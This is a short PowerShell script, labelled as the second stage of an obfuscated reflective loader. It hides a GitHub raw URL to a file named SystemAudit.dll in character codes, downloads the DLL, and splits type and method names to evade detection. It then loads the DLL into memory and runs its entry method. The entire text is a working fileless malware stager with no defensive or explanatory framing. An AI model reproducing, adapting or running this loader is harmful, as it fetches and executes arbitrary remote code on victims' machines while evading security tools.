# Stage 2: Obfuscated Reflective Loader
$u='';@ (104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,102,108,111,111,114,115,111,102,111,108,103,97,45,115,118,103,47,115,105,103,110,101,100,102,105,108,101,115,47,109,97,105,110,47,83,121,115,116,101,109,65,117,100,105,116,46,100,108,108).ForEach({$u+=[char]$_});
$d=(New-Object Net.WebClient).DownloadData($u);
$t=[type](<'System.Reflection.As' + 'sembly'>);
$a=$t::('Lo' + 'ad').Invoke($d);
$a.GetType('SystemAudit.Loader').GetMethod('Run').Invoke($null,$null);
